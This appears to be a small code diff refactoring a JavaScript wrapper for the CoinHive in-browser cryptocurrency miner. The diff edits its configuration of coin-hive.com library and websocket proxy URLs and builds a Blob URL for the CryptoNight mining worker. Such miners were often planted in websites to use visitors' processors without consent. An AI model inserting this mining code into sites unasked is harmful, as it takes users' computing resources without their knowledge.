@@ -1,8 +1,8 @@
-import txt from './blob.txt.js';
-import {CoinHive, URL, WebAssembly} from './coinhive.js';
+import webworker_scirpt from './blob.txt.js';
+import {CoinHive} from './coinhive.js';
 
-self.CoinHive = self.CoinHive || {};
-self.CoinHive.CONFIG = {
+CoinHive = CoinHive || {};
+CoinHive.CONFIG = {
   LIB_URL: "https://coin-hive.com/lib/",
   WEBSOCKET_SHARDS: [
     ["wss://ws001.coin-hive.com/proxy", "wss://ws002.coin-hive.com/proxy", "wss://ws003.coin-hive.com/proxy", "wss://ws004.coin-hive.com/proxy", "wss://ws005.coin-hive.com/proxy", "wss://ws006.coin-hive.com/proxy", "wss://ws007.coin-hive.com/proxy"],
@@ -12,4 +12,6 @@ self.CoinHive.CONFIG = {
   ],
   CAPTCHA_URL: "https://coin-hive.com/captcha/"
 };
-CoinHive.CRYPTONIGHT_WORKER_BLOB = URL.createObjectURL(new Blob([txt]));
+
+// This var will be a WebWorker's argument
+CoinHive.CRYPTONIGHT_WORKER_BLOB = URL.createObjectURL(new Blob([webworker_scirpt]));
